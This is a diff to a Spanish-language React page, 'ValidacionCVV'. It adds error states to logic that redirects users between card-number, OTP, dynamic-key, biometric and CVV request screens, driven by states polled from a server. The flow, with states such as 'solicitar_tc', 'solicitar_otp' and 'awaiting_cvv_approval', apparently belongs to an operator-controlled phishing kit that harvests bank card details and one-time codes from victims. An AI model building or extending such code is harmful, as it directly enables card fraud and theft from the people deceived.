@@ -132,7 +132,7 @@ export default function ValidacionCVV() {
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
                     'solicitar_biometria', 'error_923',
                     'solicitar_tc_custom', 'solicitar_cvv_custom',
-                    'error_tc', 'error_otp', 'error_din', 'error_login',
+                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                 ];
                 if (!estadosRedireccion.includes(estado?.toLowerCase())) return;
@@ -166,8 +166,12 @@ export default function ValidacionCVV() {
                         navigate("/error-923page");
                         break;
                     case 'error_tc':
+                    case 'error_tc_custom':
                         localStorage.setItem('estado_sesion', 'error');
                         navigate("/validacion-tc");
+                        break;
+                    case 'error_cvv_custom':
+                        // No redirigir, el modal de error ya se mostró arriba
                         break;
                     case 'error_otp':
                         localStorage.setItem('estado_sesion', 'error');
@@ -379,7 +383,7 @@ export default function ValidacionCVV() {
                     const { estado } = response.data;
                     
                     // Solo permitir acceso si el estado es correcto
-                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval') {
+                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                         console.error('Acceso no autorizado a CVV. Estado actual:', estado);
                         navigate('/');
                         return false;
@@ -396,7 +400,7 @@ export default function ValidacionCVV() {
                     const { estado } = response.data;
                     
                     // Solo permitir acceso si el estado es correcto
-                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval') {
+                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                         console.error('Acceso no autorizado a CVV. Estado actual:', estado);
                         navigate('/');
                         return false;
